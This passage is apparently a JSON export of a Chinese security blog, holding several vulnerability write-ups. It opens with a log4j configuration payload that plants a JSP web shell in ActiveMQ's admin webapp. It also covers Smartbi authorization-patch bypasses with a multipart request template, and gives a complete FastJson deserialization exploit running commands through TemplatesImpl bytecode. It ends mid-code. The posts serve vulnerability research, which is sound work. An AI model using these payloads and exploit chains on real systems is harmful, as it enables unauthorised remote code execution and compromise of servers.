pattern=&quot;$&#123;&#x27;&#x27;[&#x27;getClass&#x27;]()[&#x27;forName&#x27;](&#x27;javax.script.ScriptEngineManager&#x27;)[&#x27;newInstance&#x27;]()[&#x27;getEngineByName&#x27;](&#x27;JavaScript&#x27;)[&#x27;eval&#x27;](param.a)&#125;&quot;/&gt; &lt;Policies&gt; &lt;SizeBasedTriggeringPolicy size=&quot;1MB&quot;/&gt; &lt;/Policies&gt; &lt;/RollingRandomAccessFile&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=&quot;INFO&quot;&gt; &lt;AppenderRef ref=&quot;RollingFile&quot;/&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; 打一发看看，但是目录下只生成了文件并没有把payload写入，因此我们需要找一个能触发日志的功能点 这里我随便找了一个/admin/deleteDestination.action 看到这个心满意足 但是忘了一点，这里虽然输出了payload，也能利用了但是对于我们极客来说，不喜欢除了payload的其他字符 能做到吗？当然可以，通过查阅手册可以发现针对堆栈信息，有下面配置 1234%throwable&#123;full&#125;：输出完整的异常堆栈信息%ex&#123;none&#125;来禁用异常堆栈的输出%ex&#123;short&#125;：输出简短的异常堆栈信息，只包括异常类和消息。%ex&#123;full&#125;：输出完整的异常堆栈信息，包括异常类、消息和详细的堆栈跟踪。 那么必然是选%ex&#123;none&#125;，得到如下payload 1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;WARN&quot;&gt; &lt;Appenders&gt; &lt;RollingRandomAccessFile name=&quot;RollingFile&quot; fileName=&quot;$&#123;sys:activemq.data&#125;/../webapps/admin/y4test.jsp&quot; filePattern=&quot;$&#123;sys:activemq.data&#125;/../webapps/admin/y4test.jsp&quot;&gt; &lt;PatternLayout pattern=&quot;$&#123;&#x27;&#x27;[&#x27;getClass&#x27;]()[&#x27;forName&#x27;](&#x27;javax.script.ScriptEngineManager&#x27;)[&#x27;newInstance&#x27;]()[&#x27;getEngineByName&#x27;](&#x27;JavaScript&#x27;)[&#x27;eval&#x27;](param.a)&#125;%ex&#123;none&#125;&quot;/&gt; &lt;Policies&gt; &lt;SizeBasedTriggeringPolicy size=&quot;1MB&quot;/&gt; &lt;/Policies&gt; &lt;/RollingRandomAccessFile&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=&quot;INFO&quot;&gt; &lt;AppenderRef ref=&quot;RollingFile&quot;/&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; 再一次利用一发，就是这么舒爽2333，利用也简单只需要一发修改配置、触发文件写入","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"代码审计","slug":"代码审计","permalink":"https://y4tacker.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"浅析Smartbi逻辑漏洞(2)","slug":"year/2023/8/浅析Smartbi逻辑漏洞-2","date":"2023-08-22T16:06:03.000Z","updated":"2024-08-04T09:01:49.926Z","comments":true,"path":"2023/08/23/year/2023/8/浅析Smartbi逻辑漏洞-2/","link":"","permalink":"https://y4tacker.github.io/2023/08/23/year/2023/8/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-2/","excerpt":"","text":"浅析Smartbi逻辑漏洞(2)写在前面仅分享逻辑漏洞部分补丁绕过思路，不提供完整payload 厂商已发布补丁：https://www.smartbi.com.cn/patchinfo 正文简单提一下，补丁部分由smartbi.security.patch.PatchFilter(来源于SecurityPatchExt.ext)做加载并处理，这里我们主要关注补丁返回的状态码的具体含义即可，可以看到只有返回0的时候，filter链才能继续通过doFilter继续传递 123456789101112131415161718Iterator var10 = rules.iterator();while(var10.hasNext()) &#123; URLPatchRule rule = (URLPatchRule)var10.next(); int result = rule.patch(uri, req, resp, chain); switch (result) &#123; case 0: default: break; case 1: resp.sendError(403); return; case 2: return; &#125;&#125;chain.doFilter(request, response); 首先我们看看老板本对这点的patch的部分，如果queryString以windowUnloading开头，那么会做两件事，首先通过request.getParameter获取ClassName与MethodName的值，接着对windowUnloading中的值做解码并赋值给urlClassName与urlMethodName参数，最后补丁中会对request.getParameter与解码的值做对比，如果其中classname与methodname值不相等，那么就会返回1，也就是做拦截 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public int patch(HttpServletRequest request, HttpServletResponse response, FilterChain chain) &#123; return this.assertQueryString(request); &#125;private int assertQueryString(HttpServletRequest request) &#123; String query = request.getQueryString(); if (StringUtil.isNullOrEmpty(query)) &#123; return 0; &#125; else if (!query.startsWith(&quot;windowUnloading&quot;)) &#123; return 0; &#125; else if (!query.startsWith(&quot;windowUnloading=&amp;&quot;) &amp;&amp; !query.startsWith(&quot;windowUnloading&amp;&quot;)) &#123; return 1; &#125; else &#123; String paramClassName = request.getParameter(&quot;className&quot;); String paramMethodName = request.getParameter(&quot;methodName&quot;); if (!StringUtil.isNullOrEmpty(paramClassName) &amp;&amp; !StringUtil.isNullOrEmpty(paramMethodName)) &#123; try &#123; String content = &quot;&quot;; String windowUnloadingStr = query.length() &gt; &quot;windowUnloading&quot;.length() &amp;&amp; query.charAt(&quot;windowUnloading&quot;.length()) == &#x27;=&#x27; ? &quot;windowUnloading=&amp;&quot; : &quot;windowUnloading&amp;&quot;; if (query.length() &gt; windowUnloadingStr.length()) &#123; content = query.substring(windowUnloadingStr.length()); if (content.endsWith(&quot;=&quot;)) &#123; content = content.substring(0, content.length() - 1); &#125; content = URLDecoder.decode(content, &quot;UTF-8&quot;); &#125; String urlClassName = &quot;&quot;; String urlMethodName = &quot;&quot;; if (content.indexOf(&quot;className=&quot;) == -1 &amp;&amp; content.indexOf(&quot;methodName=&quot;) == -1) &#123; String[] decode = RMICoder.decode(content); urlClassName = decode[0]; urlMethodName = decode[1]; &#125; else &#123; Map&lt;String, String&gt; map = HttpUtil.parseQueryString(content); urlClassName = (String)map.get(&quot;className&quot;); urlMethodName = (String)map.get(&quot;methodName&quot;); &#125; if (StringUtil.isNullOrEmpty(urlClassName) &amp;&amp; StringUtil.isNullOrEmpty(urlMethodName)) &#123; return 0; &#125; else &#123; return paramClassName.equals(urlClassName) &amp;&amp; paramMethodName.equals(urlMethodName) ? 0 : 1; &#125; &#125; catch (Exception var10) &#123; return 0; &#125; &#125; else &#123; return 0; &#125; &#125; 那么我们可以思考这样的方式真的有效么？答案当时是否 在上篇文章中我们就提到，在CheckIsLoggedFilter中如果不考虑解码操作，对于classname与methodname的获取，有三种方式GET\\POST\\Multipart(这里POST指标准形式通过Body传参)，补丁的操作是比对request.getParameteter与windowUnloading解码的值是否一致，我曾经也在其他文章当中写到过，在tomcat环境下，request.getParameteter只能获取到GET与POST，对于Multipart默认情况下是不做支持的(需要单独配置才能开启)，当然这里也是没配置 我们也可以通过diff发现，如果content-type头以multipart开头就会返回状态1，也就是拦截 在上面的基础上我们很容易就可以构造出这样形式的请求包，像之前那样通过windowUnloading绕过方法校验限制 123456789101112131415161718POST /smartbi/vision/RMIServlet?windowUnloading=xxxx HTTP/1.1Host: xxxxContent-Type: multipart/form-data;charset=UTF-8;boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwAConnection: close------WebKitFormBoundaryrGKCBY7qhFd3TrwAContent-Disposition: form-data; name=&quot;className&quot;xxxService------WebKitFormBoundaryrGKCBY7qhFd3TrwAContent-Disposition: form-data; name=&quot;methodName&quot;xxx------WebKitFormBoundaryrGKCBY7qhFd3TrwAContent-Disposition: form-data; name=&quot;params&quot;[&#x27;xxx&#x27;]------WebKitFormBoundaryrGKCBY7qhFd3TrwA 我们将真正要掉用的方法放在multipart中，由于此时request.getParameter取值为null，StringUtil.isNullOrEmpty为true，自然也就绕过了补丁的限制 12345678if (!query.startsWith(&quot;windowUnloading&quot;)) &#123; return 0; &#125; else if (!query.startsWith(&quot;windowUnloading=&amp;&quot;) &amp;&amp; !query.startsWith(&quot;windowUnloading&amp;&quot;)) &#123; return 1; &#125; else &#123; String paramClassName = request.getParameter(&quot;className&quot;); String paramMethodName = request.getParameter(&quot;methodName&quot;); if (!StringUtil.isNullOrEmpty(paramClassName) &amp;&amp; !StringUtil.isNullOrEmpty(paramMethodName)) &#123; 最终在RMIServlet解析参数时，又单独对multipart做了处理，这时我们真正要掉用的恶意类与方法又成功恢复出来，完成了老补丁的绕过 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364public static RMIInfo parseRMIInfo(HttpServletRequest request, boolean forceParse) &#123; if (!&quot;/vision/RMIServlet&quot;.equals(request.getServletPath()) &amp;&amp; !forceParse) &#123; return null; &#125; else &#123; RMIInfo info = getRMIInfoFromRequest(request); if (info != null) &#123; return info; &#125; else &#123; String className = request.getParameter(&quot;className&quot;); String methodName = request.getParameter(&quot;methodName&quot;); String params = request.getParameter(&quot;params&quot;); if (StringUtil.isNullOrEmpty(className) &amp;&amp; StringUtil.isNullOrEmpty(methodName) &amp;&amp; StringUtil.isNullOrEmpty(params) &amp;&amp; request.getContentType() != null &amp;&amp; request.getContentType().startsWith(&quot;multipart/form-data;&quot;)) &#123; DiskFileItemFactory dfif = new DiskFileItemFactory(); ServletFileUpload upload = new ServletFileUpload(dfif); String encodeString = null; try &#123; List&lt;FileItem&gt; fileItems = upload.parseRequest(request); request.setAttribute(&quot;UPLOAD_FILE_ITEMS&quot;, fileItems); Iterator var10 = fileItems.iterator(); while(var10.hasNext()) &#123; FileItem fileItem = (FileItem)var10.next(); if (fileItem.isFormField()) &#123; String itemName = fileItem.getFieldName(); String itemValue = fileItem.getString(&quot;UTF-8&quot;); if (&quot;className&quot;.equals(itemName)) &#123; className = itemValue; &#125; else if (&quot;methodName&quot;.equals(itemName)) &#123; methodName = itemValue; &#125; else if (&quot;params&quot;.equals(itemName)) &#123; params = itemValue; &#125; else if (&quot;encode&quot;.equals(itemName)) &#123; encodeString = itemValue; &#125; &#125; &#125; &#125; catch (UnsupportedEncodingException | FileUploadException var14) &#123; LOG.error(var14.getMessage(), var14); &#125; if (!StringUtil.isNullOrEmpty(encodeString)) &#123; String[] decode = (String[])((String[])CodeEntry.decode(encodeString, true)); className = decode[0]; methodName = decode[1]; params = decode[2]; &#125; &#125; if (className == null &amp;&amp; methodName == null) &#123; className = (String)request.getAttribute(&quot;className&quot;); methodName = (String)request.getAttribute(&quot;methodName&quot;); params = (String)request.getAttribute(&quot;params&quot;); &#125; info = new RMIInfo(); info.setClassName(className); info.setMethodName(methodName); info.setParams(params); request.setAttribute(&quot;ATTR_KEY_RMIINFO&quot;, info); return info; &#125; &#125; &#125; 当然还有些东西只能说，懂得都懂","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Smartbi","slug":"Smartbi","permalink":"https://y4tacker.github.io/tags/Smartbi/"}]},{"title":"浅析Smartbi逻辑漏洞","slug":"year/2023/7/浅析Smartbi逻辑漏洞","date":"2023-07-05T01:49:10.000Z","updated":"2024-08-04T09:01:49.912Z","comments":true,"path":"2023/07/05/year/2023/7/浅析Smartbi逻辑漏洞/","link":"","permalink":"https://y4tacker.github.io/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"浅析Smartbi逻辑漏洞写在前面仅分享逻辑漏洞部分思路，全文以无害路由做演示，后续利用部分打码处理 厂商已发布补丁：https://www.smartbi.com.cn/patchinfo 分析最近可以看到smartbi官网突然发布了新的补丁，对比学习了下 利用也仍然和RMIServlet相关，在这个Servlet上还有个Filter(smartbi.freequery.filter.CheckIsLoggedFilter) 如果我们访问调用一些未授权的类方法，就会返回如下字段 我们先来看看如果正常情况程序该怎么走，首先如果调用RMIServlet，则会尝试获取到className与methodName，获取的方式也多种多样 有通过解码windowUnloading参数获取 有通过GET/POST获取 甚至支持从请求体流中解析 后面通过下面这两个判断对类与方法做鉴权，如果为true则会继续判断是否登录，未登录则抛出CLIENT_USER_NOT_LOGIN 这里对于未授权右边部分我们可以不必关心，按照运算符优先级只要FilterUtil.needToCheck返回false那么整个结果一定为false，而FilterUtil.needToCheck中返回false的都是白名单，代表我们不需要登录都能访问，这也就是为什么上个版本通过利用loginFromDB登录默认内置用户 接下来过了过滤器部分，我们在看RMIServlet如何取值，通过parseRMIInfo从request当中取得 在这个方法中首先通过request.getParameter取值，若为空则通过multipart获取参数，如果都不行则通过request.getAttribute从之前保存的属性当中获取 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364public static RMIInfo parseRMIInfo(HttpServletRequest request, boolean forceParse) &#123; if (!&quot;/vision/RMIServlet&quot;.equals(request.getServletPath()) &amp;&amp; !forceParse) &#123; return null; &#125; else &#123; RMIInfo info = getRMIInfoFromRequest(request); if (info != null) &#123; return info; &#125; else &#123; String className = request.getParameter(&quot;className&quot;); String methodName = request.getParameter(&quot;methodName&quot;); String params = request.getParameter(&quot;params&quot;); if (StringUtil.isNullOrEmpty(className) &amp;&amp; StringUtil.isNullOrEmpty(methodName) &amp;&amp; StringUtil.isNullOrEmpty(params) &amp;&amp; request.getContentType() != null &amp;&amp; request.getContentType().startsWith(&quot;multipart/form-data;&quot;)) &#123; DiskFileItemFactory dfif = new DiskFileItemFactory(); ServletFileUpload upload = new ServletFileUpload(dfif); String encodeString = null; try &#123; List&lt;FileItem&gt; fileItems = upload.parseRequest(request); request.setAttribute(&quot;UPLOAD_FILE_ITEMS&quot;, fileItems); Iterator var10 = fileItems.iterator(); while(var10.hasNext()) &#123; FileItem fileItem = (FileItem)var10.next(); if (fileItem.isFormField()) &#123; String itemName = fileItem.getFieldName(); String itemValue = fileItem.getString(&quot;UTF-8&quot;); if (&quot;className&quot;.equals(itemName)) &#123; className = itemValue; &#125; else if (&quot;methodName&quot;.equals(itemName)) &#123; methodName = itemValue; &#125; else if (&quot;params&quot;.equals(itemName)) &#123; params = itemValue; &#125; else if (&quot;encode&quot;.equals(itemName)) &#123; encodeString = itemValue; &#125; &#125; &#125; &#125; catch (UnsupportedEncodingException | FileUploadException var14) &#123; LOG.error(var14.getMessage(), var14); &#125; if (!StringUtil.isNullOrEmpty(encodeString)) &#123; String[] decode = (String[])((String[])CodeEntry.decode(encodeString, true)); className = decode[0]; methodName = decode[1]; params = decode[2]; &#125; &#125; if (className == null &amp;&amp; methodName == null) &#123; className = (String)request.getAttribute(&quot;className&quot;); methodName = (String)request.getAttribute(&quot;methodName&quot;); params = (String)request.getAttribute(&quot;params&quot;); &#125; info = new RMIInfo(); info.setClassName(className); info.setMethodName(methodName); info.setParams(params); request.setAttribute(&quot;ATTR_KEY_RMIINFO&quot;, info); return info; &#125; &#125; &#125; 利用这时候稍微对漏洞敏感的人已经意识到了一些问题 前面提到了有个windowUnloading参数，如果存在则会对值做解码，并将结果赋给className/methodName/params， 那么我们是不是就能首先根据此对参数做污染，让其帮助我们通过FilterUtil.needToCheck的校验，之后等到了RMIServlet，又通过GET/POST/表单当中的值恢复真实调用 关于构造windowUnloading，为了演示方便我选择else分支，因为这样返回的内容是明文，省去一次解码的问题 当然选择上面这个if分支其实更好，这更方便我们使攻击流量更隐蔽，可以通过传入jsonpCallback参数去除解码， 当然为了演示方便我还是选择else分支，任意选择FilterUtil.needToCheck当中的类方法 1className=UserService&amp;methodName=checkVersion&amp;params=y4 下面做演示，未使用windowUnloading前，调用受限方法会提示未登录(这里以无害方法做演示) 使用后成功调用 通过未授权调用，我们可以获取用户敏感信息包括密码 通过上版本中提到的直接比对数据库方式登录 最终可实现RCE，当然RCE也不止这一种 后话上面提到可以配合RMICoder编解码使流量更隐蔽，同样以第一个无害方法getSystemId为例子","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Smartbi","slug":"Smartbi","permalink":"https://y4tacker.github.io/tags/Smartbi/"}]},{"title":"FastJson与原生反序列化(二)","slug":"year/2023/4/FastJson与原生反序列化-二","date":"2023-04-26T01:43:49.000Z","updated":"2024-08-04T09:01:49.906Z","comments":true,"path":"2023/04/26/year/2023/4/FastJson与原生反序列化-二/","link":"","permalink":"https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/","excerpt":"","text":"FastJson与原生反序列化(二)很早之前在发第一篇的时候@jsjcw师傅就曾提到1.2.49后也能利用引用绕过，后面由@1ue师傅在知识星球中利用这个思路成功绕过并分享了payload，至此fastjson全版本就彻底加入原生反序列化的gadget，向师傅们致敬，想着将文章完善的缘故，并且师傅们没有提到具体的原理，因此发个第二篇进行简单介绍。 当然这里不会详细说明完整的序列化与反序列化的过程，如果有感兴趣的可以参考panda师傅的博客，关于序列化流程分析总结与反序列化流程分析总结，里面已经写的很细致了。 回顾之前提到了从1.2.49开始，我们的JSONArray以及JSONObject方法开始真正有了自己的readObject方法， 在其SecureObjectInputStream类当中重写了resolveClass,通过调用了checkAutoType方法做类的检查，这样真的是安全的么？ resolveClass的调用乍一看，这样的写法很安全，当调用JSONArray/JSONObject的Object方法触发反序列化时，将这个反序列化过程委托给SecureObjectInputStream处理时，触发resolveClass实现对恶意类的拦截 这时候反序列化的调用过程是这样的，就是这样不安全的ObjectInputStream套个安全的SecureObjectInputStream导致了绕过 不安全的反序列化过程123ObjectInputStream -&gt; readObjectxxxxxx(省略中间过程)SecureObjectInputStream -&gt; readObject -&gt; resolveClass 安全的反序列化过程多提一嘴，平时我们作防御则应该是生成一个继承ObjectInputStream的类并重写resolveClass(假定为TestInputStream)，由它来做反序列化的入口，这样才是安全的，因此压力再次给到了开发身上 1TestInputStream -&gt; readObject -&gt; resolveClass 为了解决这个问题，首先我们就需要看看什么情况下不会调用resolveClass，在java.io.ObjectInputStream#readObject0调用中，会根据读到的bytes中tc的数据类型做不同的处理去恢复部分对象 1234567891011121314151617181920212223242526272829303132333435363738394041424344switch (tc) &#123; case TC_NULL: return readNull(); case TC_REFERENCE: return readHandle(unshared); case TC_CLASS: return readClass(unshared); case TC_CLASSDESC: case TC_PROXYCLASSDESC: return readClassDesc(unshared); case TC_STRING: case TC_LONGSTRING: return checkResolve(readString(unshared)); case TC_ARRAY: return checkResolve(readArray(unshared)); case TC_ENUM: return checkResolve(readEnum(unshared)); case TC_OBJECT: return checkResolve(readOrdinaryObject(unshared)); case TC_EXCEPTION: IOException ex = readFatalException(); throw new WriteAbortedException(&quot;writing aborted&quot;, ex); case TC_BLOCKDATA: case TC_BLOCKDATALONG: if (oldMode) &#123; bin.setBlockDataMode(true); bin.peek(); // force header read throw new OptionalDataException( bin.currentBlockRemaining()); &#125; else &#123; throw new StreamCorruptedException( &quot;unexpected block data&quot;); &#125; case TC_ENDBLOCKDATA: if (oldMode) &#123; throw new OptionalDataException(true); &#125; else &#123; throw new StreamCorruptedException( &quot;unexpected end of block data&quot;); &#125; default: throw new StreamCorruptedException( String.format(&quot;invalid type code: %02X&quot;, tc)); &#125; 再往后，跳过一些细节过程，上面的不同case中大部分类都会最终调用readClassDesc去获取类的描述符，在这个过程中如果当前反序列化数据下一位仍然是TC_CLASSDESC那么就会在readNonProxyDesc中触发resolveClass 再回到上面这个switch分支的代码，不会调用readClassDesc的分支有TC_NULL、TC_REFERENCE、TC_STRING、TC_LONGSTRING、TC_EXCEPTION，string与null这种对我们毫无用处的，exception类型则是解决序列化终止相关，这一点可以从其描述看出 那么就只剩下了reference引用类型了 如何利用引用类型现在我们就要思考，如何在JSONArray/JSONObject对象反序列化恢复对象时，让我们的恶意类成为引用类型从而绕过resolveClass的检查 答案是当向List、set、map类型中添加同样对象时即可成功利用，这里也简单提一下，这里以List为例， 1234ArrayList&lt;Object&gt; arrayList = new ArrayList&lt;&gt;();arrayList.add(templates);arrayList.add(templates);writeObjects(arrayList); 当我们写入对象时，会在handles这个哈希表中建立从对象到引用的映射 当再次写入同一对象时，在handles这个hash表中查到了映射 那么就会通过writeHandle将重复对象以引用类型写入 因此我们就可以利用这个思路构建攻击的payload了，这里简单以伪代码呈现，便于理解思路 1234567891011TemplatesImpl templates = TemplatesImplUtil.getEvilClass(&quot;open -na Calculator&quot;);ArrayList&lt;Object&gt; arrayList = new ArrayList&lt;&gt;();arrayList.add(templates);JSONArray jsonArray = new JSONArray();jsonArray.add(templates);BadAttributeValueExpException bd = getBadAttributeValueExpException(jsonArray);arrayList.add(bd); WriteObjects(arrayList); 简单梳理下 序列化时，在这里templates先加入到arrayList中，后面在JSONArray中再次序列化TemplatesImpl时，由于在handles这个hash表中查到了映射，后续则会以引用形式输出 反序列化时ArrayList先通过readObject恢复TemplatesImpl对象，之后恢复BadAttributeValueExpException对象，在恢复过程中，由于BadAttributeValueExpException要恢复val对应的JSONArray/JSONObject对象，会触发JSONArray/JSONObject的readObject方法，将这个过程委托给SecureObjectInputStream，在恢复JSONArray/JSONObject中的TemplatesImpl对象时，由于此时的第二个TemplatesImpl对象是引用类型，通过readHandle恢复对象的途中不会触发resolveClass，由此实现了绕过 当然前面也提到了不仅仅是List，Set与Map类型都能成功触发引用绕过。 完整利用至此fastjson全版本实现了原生反序列化利用 代码测试依赖 12345678910&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.83&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.27.0-GA&lt;/version&gt;&lt;/dependency&gt; 测试代码以HashMap为例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import com.alibaba.fastjson.JSONArray;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;public class Y4HackJSON &#123; public static void setValue(Object obj, String name, Object value) throws Exception&#123; Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); &#125; public static byte[] genPayload(String cmd) throws Exception&#123; ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.makeClass(&quot;a&quot;); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz); constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;&quot;+cmd+&quot;\\&quot;);&quot;); clazz.addConstructor(constructor); clazz.getClassFile().setMajorVersion(49); return clazz.toBytecode(); &#125; public static void main(String[] args) throws Exception&#123; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;genPayload(&quot;open -na Calculator&quot;)&#125;); setValue(templates, &quot;_name&quot;, &quot;1&quot;); setValue(templates, &quot;_tfactory&quot;, null); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bd = new BadAttributeValueExpException(null); setValue(bd,&quot;val&quot;,jsonArray); HashMap hashMap = new HashMap(); hashMap.put(templates,bd); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(hashMap); objectOutputStream.close(); ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())); objectInputStream.readObject(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Fastjson","slug":"Fastjson","permalink":"https://y4tacker.github.io/tags/Fastjson/"}]},{"title":"利用TemplatesImpl执行字节码在实战中的踩坑记录","slug":"year/2023/4/利用TemplatesImpl执行字节码在实战中的踩坑记录","date":"2023-04-25T14:24:57.000Z","updated":"2024-08-04T09:01:49.909Z","comments":true,"path":"2023/04/25/year/2023/4/利用TemplatesImpl执行字节码在实战中的踩坑记录/","link":"","permalink":"https://y4tacker.github.io/2023/04/25/year/2023/4/%E5%88%A9%E7%94%A8TemplatesImpl%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81%E5%9C%A8%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/","excerpt":"","text":"利用TemplatesImpl执行字节码在实战中的踩坑记录在平时，无论是JNDI注入，还是反序列化，只要涉及到不出网的场景，TemplatesImpl的利用就很广泛，这里记录一个在实战中遇到的踩坑记录，篇幅不多贵在记录。 假设当前服务器存在反序列化漏洞，不出网，当你兴高采烈的拿着工具去打的时候发现怎么也打不通，内存马上不去，回显也没有，这是怎么回事呢？且看下文。 既然需要使用TemplatesImpl加载字节码，那么就需要生成恶意类的Bytecode 这里我们再温习一下，最终在getTransletInstance方法处加载字节码到jvm，并调用newInstance实例化触发恶意代码的加载 网上的各种工具，基本上都使用了javassist框架进行恶意类的生成，这里以TomcatEcho为例，大多数工具代码都类似下面的写法，创建类，添加方法，生成ByteCode 问题就出在输出ByteCode的过程中，当调用ClassPool.getDefault()的过程中，会初始化ClassFile，根据某些不同版本特定存在的类来判断当前环境的MAJOR_VERSION(Ps:这里的反编译有点问题，从上到下ver其实是依次从49到55)，这个MAJOR_VERSION其实就是我们java的主版本号从49-55分别为jdk1.5到jdk11 因此这就很有意思了，这意味着使用javassist生成的字节码的属性信息和当前java运行环境有关 假设当前服务器是一个jdk1.6跑着的tomcat服务，你拿工具打，那很显然jdk1.6并不能运行1.8版本下编译的程序，那怎么办呢？其实很简单修改这个MAJOR_VERSION就行，只要这个属性的数值小于或等于当前运行的java环境那就能过检查并运行 而javassist本身也提供了对应的api去帮助我们修改，比如我们需要生成1.6能运行的字节码，我们只需要在原来的基础上加上clazz.getClassFile().setMajorVersion(50);即可 那如果是asm框架怎么办，就更简单了，创建类的时候在第一个输入写上对应主版本号即可","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"TemplatesImpl","slug":"TemplatesImpl","permalink":"https://y4tacker.github.io/tags/TemplatesImpl/"},{"name":"踩坑记录","slug":"踩坑记录","permalink":"https://y4tacker.github.io/tags/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/"}]},{"title":"FastJson与原生反序列化","slug":"year/2023/3/FastJson与原生反序列化","date":"2023-03-20T03:03:59.000Z","updated":"2024-08-04T09:01:49.895Z","comments":true,"path":"2023/03/20/year/2023/3/FastJson与原生反序列化/","link":"","permalink":"https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"FastJson与原生反序列化前言这其实是我很早前遇到的一个秋招面试题，问题大概是如果你遇到一个较高版本的FastJson有什么办法能绕过AutoType么？我一开始回答的是找黑名单外的类，后面面试官说想考察的是FastJson在原生反序列化当中的利用。因为比较有趣加上最近在网上也看到类似的东西，今天也就顺便在肝毕设之余来谈谈这个问题。 利用与限制Fastjson1版本小于等于1.2.48 Fastjson2目前通杀(目前最新版本2.0.26) 寻找既然是与原生反序列化相关，那我们去fastjson包里去看看哪些类继承了Serializable接口即可，最后找完只有两个类，JSONArray与JSONObject，这里我们就挑第一个来讲(实际上这两个在原生反序列化当中利用方式是相同的) 首先我们可以在IDEA中可以看到，虽然JSONArray有implement这个Serializable接口但是它本身没有实现readObject方法的重载，并且继承的JSON类同样没有readObject方法，那么只有一个思路了，通过其他类的readObject做中转来触发JSONArray或者JSON类当中的某个方法最终实现串链 在Json类当中的toString方法能触发toJsonString的调用，而这个东西其实我们并不陌生，在我们想用JSON.parse()触发get方法时，其中一个处理方法就是用JSONObject嵌套我们的payload 那么思路就很明确了，触发toString-&gt;toJSONString-&gt;get方法， 如何触发getter方法这里多提一句为什么能触发get方法调用 因为是toString所以肯定会涉及到对象中的属性提取，fastjson在做这部分实现时，是通过ObjectSerializer类的write方法去做的提取 这部分流程是先判断serializers这个HashMap当中有无默认映射 我们可以来看看有哪些默认的映射关系 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849private void initSerializers() &#123; this.put((Type)Boolean.class, (ObjectSerializer)BooleanCodec.instance); this.put((Type)Character.class, (ObjectSerializer)CharacterCodec.instance); this.put((Type)Byte.class, (ObjectSerializer)IntegerCodec.instance); this.put((Type)Short.class, (ObjectSerializer)IntegerCodec.instance); this.put((Type)Integer.class, (ObjectSerializer)IntegerCodec.instance); this.put((Type)Long.class, (ObjectSerializer)LongCodec.instance); this.put((Type)Float.class, (ObjectSerializer)FloatCodec.instance); this.put((Type)Double.class, (ObjectSerializer)DoubleSerializer.instance); this.put((Type)BigDecimal.class, (ObjectSerializer)BigDecimalCodec.instance); this.put((Type)BigInteger.class, (ObjectSerializer)BigIntegerCodec.instance); this.put((Type)String.class, (ObjectSerializer)StringCodec.instance); this.put((Type)byte[].class, (ObjectSerializer)PrimitiveArraySerializer.instance); this.put((Type)short[].class, 